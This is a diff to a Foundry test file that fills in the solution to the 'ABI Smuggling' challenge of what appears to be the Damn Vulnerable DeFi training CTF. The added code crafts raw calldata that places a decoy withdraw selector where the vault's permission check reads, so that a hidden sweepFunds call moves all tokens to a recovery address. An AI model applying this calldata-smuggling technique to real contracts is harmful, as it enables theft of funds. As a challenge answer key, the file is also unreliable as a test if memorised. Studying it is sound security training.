@@ -4,6 +4,7 @@ pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import {SelfAuthorizedVault, AuthorizedExecutor, IERC20} from "../../src/abi-smuggling/SelfAuthorizedVault.sol";
 
 contract ABISmugglingChallenge is Test {
@@ -73,7 +74,25 @@ contract ABISmugglingChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_abiSmuggling() public checkSolvedByPlayer {
-        
+         bytes memory sweepFundsCall = abi.encodeWithSelector(
+        vault.sweepFunds.selector,
+        recovery,
+        address(token)
+    );
+
+    bytes memory payload = abi.encodePacked(
+        vault.execute.selector,                    // bytes [0:4]
+        uint256(uint160(address(vault))),          // bytes [4:36]   target
+        uint256(0x80),                             // bytes [36:68]  offset=128
+        uint256(0),                                // bytes [68:100] filler
+        bytes4(vault.withdraw.selector),           // bytes [100:104] decoy selector ← check reads here
+        bytes28(0),                                // bytes [104:132] padding
+        uint256(sweepFundsCall.length),            // bytes [132:164] actual length
+        sweepFundsCall                             // bytes [164:]   actual calldata
+    );
+
+    (bool success,) = address(vault).call(payload);
+    require(success, "Attack failed");
     }
 
     /**
